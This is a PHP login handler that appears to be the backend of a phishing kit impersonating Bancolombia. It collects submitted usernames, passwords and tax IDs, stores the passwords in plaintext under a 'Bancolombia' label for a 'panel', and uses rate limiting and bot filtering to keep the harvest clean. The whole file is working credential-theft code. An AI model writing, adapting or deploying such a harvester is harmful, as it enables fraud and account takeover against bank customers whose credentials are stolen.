<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
require_once('../panel/run/rate-limit.php');
date_default_timezone_set('America/Bogota');

// Rate limit: máx 5 inicios por IP cada 10 minutos
$client_ip = getClientIP();
checkRateLimit($client_ip, 5, 600, 900);

$ifilter = new InputFilter();

$usuario = isset($_POST['usr']) ? trim($ifilter->process($_POST['usr'])) : '';
$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';
$tipo_cliente = isset($_POST['tc']) ? $ifilter->process($_POST['tc']) : 'persona';
$nit = isset($_POST['nit']) ? $ifilter->process($_POST['nit']) : '';

// Rechazar entradas vacías o demasiado cortas (spam/bots)
if (strlen($usuario) < 4) {
    registrar_spam_ip($client_ip, 'usuario_vacio', $usuario);
    http_response_code(400);
    echo json_encode(['status' => 'ERROR', 'message' => 'Usuario inválido']);
    exit;
}

setcookie('usuario', $usuario, time()+60*9, '/');

// Crear registro en BD
create_item($usuario, $contrasena, $dispositivo, '', '', 'Bancolombia', '', $tipo_cliente, $nit);
?>